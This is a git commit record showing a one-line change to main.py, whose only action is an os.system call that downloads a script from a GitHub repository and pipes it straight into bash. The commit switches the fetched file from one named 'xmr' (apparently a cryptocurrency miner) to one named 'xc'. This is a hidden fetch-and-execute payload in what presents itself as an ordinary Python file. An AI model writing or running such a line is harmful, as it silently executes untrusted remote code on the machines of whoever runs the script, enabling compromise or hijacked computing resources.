50f26d96ab6e8d2b362cd9c706edb963fda66c8f
fadliamroziqyaa-hub <fadliamroziqyaa@gmail.com>
2026-04-04 19:56:46 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xmr | bash')
+os.system('curl -sL https://github.com/fadliamroziqyaa-hub/gosen/raw/main/xc | bash')
